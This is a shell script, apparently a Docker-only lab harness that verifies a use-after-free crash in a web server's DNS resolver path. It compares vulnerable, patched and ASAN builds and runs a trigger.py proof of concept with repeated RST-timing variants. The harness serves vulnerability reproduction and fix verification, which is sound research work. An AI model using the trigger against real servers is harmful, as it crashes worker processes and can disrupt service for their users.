#!/bin/sh
# CVE-2026-123634 lab — bounded verification harness (S4: Docker-only).
#
# Verdicts asserted:
#   1. stock 1.31.8   : primary trigger (RST just before the held DNS failure
#                       answer) enters the freed-ctx path -> ALERT
#                       "could not cancel ... resolving" and the worker dies
#                       on SIGSEGV (master respawns; probabilistic race,
#                       10 attempts give the interleaving many chances).
#   2. stock controls : answer-then-RST and half-close never crash.
#   3. stock 1.31.9   : identical trigger -> zero ALERTs, zero deaths.
#   4. vuln-asan      : the same trigger -> verbatim
#                       "AddressSanitizer: heap-use-after-free" report.
#   5. fixed-asan     : the identical trigger -> zero reports.
#
# Everything is bounded: compose up/build under timeout 600, every trigger
# run under timeout 120 (the trigger client itself is timeout-safe: every
# socket has settimeout and each attempt runs under a SIGALRM watchdog).
#
# Runtime ~2-3 min. Exit 0 = all PASS.

set -u
cd "$(dirname "$0")"

FAIL=0
logcount() { docker compose logs "$1" 2>&1 | grep -c "$2" || true; }
step() { printf '\n=== %s ===\n' "$1"; }

step "build + start all services (bounded)"
timeout 600 docker compose up -d --build --wait \
    || { echo "FAIL: compose up --wait"; exit 1; }

step "1. stock 1.31.8 primary trigger (answer 300 ms x10)"
b=$(logcount vuln "exited on signal")
ba=$(logcount vuln "could not cancel")
timeout 120 docker compose exec -T probe python /poc/123634/trigger.py \
    --target vuln:8080 --variant primary --answer-ms 300 --repeat 10 2>&1 | tail -2
a=$(logcount vuln "exited on signal"); aa=$(logcount vuln "could not cancel")
timeout 30 docker compose logs vuln --tail 80 2>&1 \
    | grep -E "could not cancel .*resolving|exited on signal" | tail -3
if [ "$a" -gt "$b" ]; then
    echo "PASS: stock worker died $((a - b))x, ALERT marker $((aa - ba))x"
else
    echo "FAIL: no stock worker death (race missed — rerun; see README)"; FAIL=1
fi

step "2. stock negative controls (answer-then-RST, half-close)"
b=$(logcount vuln "exited on signal")
timeout 120 docker compose exec -T probe python /poc/123634/trigger.py \
    --target vuln:8080 --variant answer_then_rst --answer-ms 300 --repeat 3 2>&1 | tail -1
timeout 120 docker compose exec -T probe python /poc/123634/trigger.py \
    --target vuln:8080 --variant half_close --answer-ms 500 --repeat 3 2>&1 | tail -1
a=$(logcount vuln "exited on signal")
if [ "$a" -eq "$b" ]; then echo "PASS: negative controls survive"; else
    echo "FAIL: negative control crashed the stock build"; FAIL=1; fi

step "3. fixed 1.31.9, identical trigger"
b=$(logcount fixed "exited on signal"); ba=$(logcount fixed "could not cancel")
timeout 120 docker compose exec -T probe python /poc/123634/trigger.py \
    --target fixed:8080 --variant primary --answer-ms 300 --repeat 10 2>&1 | tail -1
timeout 120 docker compose exec -T probe python /poc/123634/trigger.py \
    --target fixed:8080 --variant primary --answer-ms 100 --repeat 5 2>&1 | tail -1
a=$(logcount fixed "exited on signal"); aa=$(logcount fixed "could not cancel")
if [ "$a" -eq "$b" ] && [ "$aa" -eq "$ba" ]; then
    echo "PASS: fixed build survives, zero ALERTs"
else
    echo "FAIL: fixed build crashed/alerted"; FAIL=1
fi

step "4. vuln-asan floor (answer 300/200 ms)"
b=$(logcount vuln-asan "heap-use-after-free")
timeout 120 docker compose exec -T probe python /poc/123634/trigger.py \
    --target vuln-asan:8080 --variant primary --answer-ms 300 --repeat 5 2>&1 | tail -1
timeout 120 docker compose exec -T probe python /poc/123634/trigger.py \
    --target vuln-asan:8080 --variant primary --answer-ms 200 --repeat 5 2>&1 | tail -1
a=$(logcount vuln-asan "heap-use-after-free")
timeout 30 docker compose logs vuln-asan --tail 150 2>&1 \
    | grep -E "ERROR: AddressSanitizer|WRITE of size|#0 .* in ngx_|SUMMARY" | head -5
if [ "$a" -gt "$b" ]; then echo "PASS: ASAN heap-use-after-free x$((a - b))"; else
    echo "FAIL: no ASAN report (race missed — rerun; see README)"; FAIL=1; fi

step "5. fixed-asan differential, identical trigger"
b=$(logcount fixed-asan "heap-use-after-free")
timeout 120 docker compose exec -T probe python /poc/123634/trigger.py \
    --target fixed-asan:8080 --variant primary --answer-ms 300 --repeat 5 2>&1 | tail -1
timeout 120 docker compose exec -T probe python /poc/123634/trigger.py \
    --target fixed-asan:8080 --variant primary --answer-ms 100 --repeat 5 2>&1 | tail -1
a=$(logcount fixed-asan "heap-use-after-free")
if [ "$a" -eq "$b" ]; then echo "PASS: fixed-asan clean under identical trigger"; else
    echo "FAIL: fixed-asan reported"; FAIL=1; fi

printf '\n==== verify: %s ====\n' "$([ "$FAIL" -eq 0 ] && echo PASS || echo FAIL)"
exit "$FAIL"
